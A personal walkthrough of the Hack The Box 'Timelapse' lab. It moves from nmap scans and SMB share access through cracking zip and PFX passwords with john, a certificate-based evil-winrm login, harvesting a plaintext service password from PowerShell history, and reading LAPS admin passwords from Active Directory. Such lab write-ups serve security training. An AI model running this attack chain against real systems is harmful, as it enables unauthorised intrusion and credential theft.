### 30082023Wed

https://app.hackthebox.com/machines/452

![[Pasted image 20230830055545.png]]

![[Pasted image 20230830055711.png]]

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ nmap -p- -Pn -vv 10.129.227.113 -oG initial-scan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 06:02 +0630
Initiating Parallel DNS resolution of 1 host. at 06:02
Completed Parallel DNS resolution of 1 host. at 06:02, 0.04s elapsed
Initiating Connect Scan at 06:02
Scanning 10.129.227.113 [65535 ports]
Discovered open port 135/tcp on 10.129.227.113
Discovered open port 139/tcp on 10.129.227.113
Discovered open port 445/tcp on 10.129.227.113
Discovered open port 53/tcp on 10.129.227.113
Discovered open port 49694/tcp on 10.129.227.113
Discovered open port 9389/tcp on 10.129.227.113
Discovered open port 3268/tcp on 10.129.227.113
Connect Scan Timing: About 18.55% done; ETC: 06:05 (0:02:16 remaining)
Discovered open port 389/tcp on 10.129.227.113
Discovered open port 3269/tcp on 10.129.227.113
Discovered open port 49667/tcp on 10.129.227.113
Connect Scan Timing: About 46.38% done; ETC: 06:04 (0:01:11 remaining)
Discovered open port 593/tcp on 10.129.227.113
Discovered open port 636/tcp on 10.129.227.113
Discovered open port 49673/tcp on 10.129.227.113
Discovered open port 88/tcp on 10.129.227.113
Discovered open port 5986/tcp on 10.129.227.113
Discovered open port 49687/tcp on 10.129.227.113
Discovered open port 464/tcp on 10.129.227.113
Discovered open port 49674/tcp on 10.129.227.113
Completed Connect Scan at 06:04, 106.43s elapsed (65535 total ports)
Nmap scan report for 10.129.227.113
Host is up, received user-set (0.039s latency).
Scanned at 2023-08-30 06:02:39 +0630 for 107s
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5986/tcp  open  wsmans           syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49673/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49687/tcp open  unknown          syn-ack
49694/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 106.50 seconds
```

```
nmap -p- --min-rate=1000 -T4 10.129.227.113 | grep '^[0-9]' | cut -d '/' -
f 1 | tr '\n' ',' | sed s/,$//
```

```
nmap -p- --min-rate=1000 -T4 10.129.227.113 -Pn
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ nmap -p- --min-rate=1000 -T4 10.129.227.113 -Pn            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 06:18 +0630
Nmap scan report for 10.129.227.113
Host is up (0.039s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49687/tcp open  unknown
49694/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 85.65 seconds
```

```
nmap -p- -sC -sV -Pn 10.129.227.113
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ nmap -p- -sC -sV -Pn 10.129.227.113
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 12:54 +0630
Nmap scan report for 10.129.227.113
Host is up (0.046s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-30 14:26:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-08-30T14:27:47+00:00; +7h59m52s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-08-30T14:27:10
|_  start_date: N/A
|_clock-skew: mean: 7h59m51s, deviation: 0s, median: 7h59m51s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 217.01 seconds
```

```
smbclient -L //10.129.227.113/
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ smbclient -L //10.129.227.113/
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
smbclient //10.129.227.113/Shares
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ smbclient //10.129.227.113/Shares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 22:09:15 2021
  ..                                  D        0  Mon Oct 25 22:09:15 2021
  Dev                                 D        0  Tue Oct 26 02:10:06 2021
  HelpDesk                            D        0  Mon Oct 25 22:18:42 2021

                6367231 blocks of size 4096. 1329227 blocks available
smb: \> ls Dev
  Dev                                 D        0  Tue Oct 26 02:10:06 2021

                6367231 blocks of size 4096. 1329227 blocks available
smb: \> ls HelpDesk
  HelpDesk                            D        0  Mon Oct 25 22:18:42 2021

                6367231 blocks of size 4096. 1329227 blocks available
smb: \> dir Dev
  Dev                                 D        0  Tue Oct 26 02:10:06 2021

                6367231 blocks of size 4096. 1329227 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Tue Oct 26 02:10:06 2021
  ..                                  D        0  Tue Oct 26 02:10:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 22:16:42 2021

                6367231 blocks of size 4096. 1329227 blocks available
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (15.5 KiloBytes/sec) (average 15.5 KiloBytes/sec)
smb: \Dev\> 
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ls -lah
total 16K
drwxr-xr-x 2 kali kali 4.0K Aug 30 13:13 .
drwxr-xr-x 5 kali kali 4.0K Aug 30 05:56 ..
-rw-r--r-- 1 kali kali  835 Aug 30 06:04 initial-scan
-rw-r--r-- 1 kali kali 2.6K Aug 30 13:13 winrm_backup.zip
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ls -lah
total 16K
drwxr-xr-x 2 kali kali 4.0K Aug 30 13:13 .
drwxr-xr-x 5 kali kali 4.0K Aug 30 05:56 ..
-rw-r--r-- 1 kali kali  835 Aug 30 06:04 initial-scan
-rw-r--r-- 1 kali kali 2.6K Aug 30 13:13 winrm_backup.zip
```

```
zip2john winrm_backup.zip > zipHash.john
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ zip2john winrm_backup.zip > zipHash.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ cat zipHash.john 
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt zipHash.john
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zipHash.john 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2023-08-30 13:24) 1.666g/s 5782Kp/s 5782Kc/s 5782KC/s surkerior..suppamas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ll
total 20
-rw-r--r-- 1 kali kali  835 Aug 30 06:04 initial-scan
-rwxr-xr-x 1 kali kali 2555 Oct 25  2021 legacyy_dev_auth.pfx
-rw-r--r-- 1 kali kali 2611 Aug 30 13:13 winrm_backup.zip
-rw-r--r-- 1 kali kali 4962 Aug 30 13:20 zipHash.john
```

```
pfx2john legacyy_dev_auth.pfx > pfxHash.john
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfxHash.john
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ll
total 28
-rw-r--r-- 1 kali kali  835 Aug 30 06:04 initial-scan
-rwxr-xr-x 1 kali kali 2555 Oct 25  2021 legacyy_dev_auth.pfx
-rw-r--r-- 1 kali kali 5077 Aug 30 13:38 pfxHash.john
-rw-r--r-- 1 kali kali 2611 Aug 30 13:13 winrm_backup.zip
-rw-r--r-- 1 kali kali 4962 Aug 30 13:20 zipHash.john
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt pfxHash.john
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfxHash.john 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:02:20 DONE (2023-08-30 13:42) 0.007133g/s 23048p/s 23048c/s 23048C/s thuglife06..thugers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![[Pasted image 20230830134452.png]]

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password:thuglegacy
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ls
initial-scan  key.pem  legacyy_dev_auth.pfx  pfxHash.john  winrm_backup.zip  zipHash.john
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
Enter Import Password:thuglegacy
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ ll
total 36
-rw------- 1 kali kali 1236 Aug 30 13:48 cert.pem
-rw-r--r-- 1 kali kali  835 Aug 30 06:04 initial-scan
-rw------- 1 kali kali 1952 Aug 30 13:48 key.pem
-rwxr-xr-x 1 kali kali 2555 Oct 25  2021 legacyy_dev_auth.pfx
-rw-r--r-- 1 kali kali 5077 Aug 30 13:38 pfxHash.john
-rw-r--r-- 1 kali kali 2611 Aug 30 13:13 winrm_backup.zip
-rw-r--r-- 1 kali kali 4962 Aug 30 13:20 zipHash.john
```

![[Pasted image 20230830135048.png]]

```
evil-winrm -i 10.129.227.113 -c cert.pem -k key.pem -S
```

![[Pasted image 20230830140001.png]]

```
7058f61fc4a4158d93981822a9abd9ea
```

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![[Pasted image 20230830140338.png]]

```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
*Evil-WinRM* PS C:\Users\legacyy\Desktop>
```

![[Pasted image 20230830140453.png]]

```
evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

```
net user svc_deploy
```

```
┌──(kali㉿kali)-[~/htb/Timelapse]
└─$ evil-winrm -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

![[Pasted image 20230830141041.png]]

Main/AdmPwd.PS/AdmPwd.PS.psd1

https://github.com/GreyCorbel/admpwd/blob/master/Main/AdmPwd.PS/AdmPwd.PS.psd1

```
upload AdmPwd.PS.psd1
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload AdmPwd.PS.psd1
                                        
Info: Uploading /home/kali/htb/Timelapse/AdmPwd.PS.psd1 to C:\Users\svc_deploy\Documents\AdmPwd.PS.psd1
                                        
Data: 3616 bytes of 3616 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls


    Directory: C:\Users\svc_deploy\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/30/2023  12:39 PM           2712 AdmPwd.PS.psd1


*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
```

![[Pasted image 20230830181137.png]]

```
Find-AdmPwdExtendedRights -identity *
```

```
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *


AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Domain Controllers/DC01
Certificates                         : {}
CN                                   : DC01
codePage                             : 0
CompoundIdentitySupported            : {False}
countryCode                          : 0
Created                              : 10/23/2021 11:40:55 AM
createTimeStamp                      : 10/23/2021 11:40:55 AM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                          : dc01.timelapse.htb
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          : 10.129.227.113
IPv6Address                          : dead:beef::44
isCriticalSystemObject               : True
isDeleted                            :
KerberosEncryptionType               : {RC4, AES128, AES256}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 133378818503342945
LastLogonDate                        : 8/30/2023 12:11:18 AM
lastLogonTimestamp                   : 133378530788186624
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 160
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 8/30/2023 12:11:47 AM
modifyTimeStamp                      : 8/30/2023 12:11:47 AM
ms-Mcs-AdmPwd                        : rzXrevV%Hd8+K4hq[9Y{0H5Z
ms-Mcs-AdmPwdExpirationTime          : 133382851070061782
msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}
msDS-GenerationId                    : {76, 210, 88, 107...}
msDS-SupportedEncryptionTypes        : 28
msDS-User-Account-Control-Computed   : 0
Name                                 : DC01
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : computer
ObjectGUID                           : 6e10b102-6936-41aa-bb98-bed624c9b98f
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1000
OperatingSystem                      : Windows Server 2019 Standard
OperatingSystemHotfix                :
OperatingSystemServicePack           :
OperatingSystemVersion               : 10.0 (17763)
PasswordExpired                      : False
PasswordLastSet                      : 8/30/2023 12:11:07 AM
PasswordNeverExpires                 : False
PasswordNotRequired                  : False
PrimaryGroup                         : CN=Domain Controllers,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 516
PrincipalsAllowedToDelegateToAccount : {}
ProtectedFromAccidentalDeletion      : False
pwdLastSet                           : 133378530676936642
rIDSetReferences                     : {CN=RID Set,CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb}
SamAccountName                       : DC01$
sAMAccountType                       : 805306369
sDRightsEffective                    : 0
serverReferenceBL                    : {CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb}
ServiceAccount                       : {}
servicePrincipalName                 : {ldap/dc01.timelapse.htb/ForestDnsZones.timelapse.htb, ldap/dc01.timelapse.htb/DomainDnsZones.timelapse.htb, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.timelapse.htb, Hyper-V Replica Service/DC01...}
ServicePrincipalNames                : {ldap/dc01.timelapse.htb/ForestDnsZones.timelapse.htb, ldap/dc01.timelapse.htb/DomainDnsZones.timelapse.htb, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc01.timelapse.htb, Hyper-V Replica Service/DC01...}
SID                                  : S-1-5-21-671920749-559770252-3318990721-1000
SIDHistory                           : {}
TrustedForDelegation                 : True
TrustedToAuthForDelegation           : False
UseDESKeyOnly                        : False
userAccountControl                   : 532480
userCertificate                      : {}
UserPrincipalName                    :
uSNChanged                           : 143429
uSNCreated                           : 12293
whenChanged                          : 8/30/2023 12:11:47 AM
whenCreated                          : 10/23/2021 11:40:55 AM

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
AuthenticationPolicySilo             : {}
BadLogonCount                        : 0
badPasswordTime                      : 0
badPwdCount                          : 0
CannotChangePassword                 : False
CanonicalName                        : timelapse.htb/Servers/Database/DB01
Certificates                         : {}
CN                                   : DB01
codePage                             : 0
CompoundIdentitySupported            : {}
countryCode                          : 0
Created                              : 10/23/2021 12:18:11 PM
createTimeStamp                      : 10/23/2021 12:18:11 PM
Deleted                              :
Description                          :
DisplayName                          :
DistinguishedName                    : CN=DB01,OU=Database,OU=Servers,DC=timelapse,DC=htb
DNSHostName                          :
DoesNotRequirePreAuth                : False
dSCorePropagationData                : {10/25/2021 9:03:35 AM, 10/25/2021 9:03:33 AM, 12/31/1600 4:04:17 PM}
Enabled                              : True
HomedirRequired                      : False
HomePage                             :
instanceType                         : 4
IPv4Address                          :
IPv6Address                          :
isCriticalSystemObject               : False
isDeleted                            :
KerberosEncryptionType               : {}
LastBadPasswordAttempt               :
LastKnownParent                      :
lastLogoff                           : 0
lastLogon                            : 0
LastLogonDate                        :
localPolicyFlags                     : 0
Location                             :
LockedOut                            : False
logonCount                           : 0
ManagedBy                            :
MemberOf                             : {}
MNSLogonAccount                      : False
Modified                             : 10/23/2021 12:18:11 PM
modifyTimeStamp                      : 10/23/2021 12:18:11 PM
msDS-User-Account-Control-Computed   : 0
Name                                 : DB01
nTSecurityDescriptor                 : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                       : CN=Computer,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
ObjectClass                          : computer
ObjectGUID                           : d38b3265-230f-47ae-bdcd-f7153da7659d
objectSid                            : S-1-5-21-671920749-559770252-3318990721-1606
OperatingSystem                      :
OperatingSystemHotfix                :
OperatingSystemServicePack           :
OperatingSystemVersion               :
PasswordExpired                      : False
PasswordLastSet                      : 10/23/2021 12:18:11 PM
PasswordNeverExpires                 : False
PasswordNotRequired                  : True
PrimaryGroup                         : CN=Domain Computers,CN=Users,DC=timelapse,DC=htb
primaryGroupID                       : 515
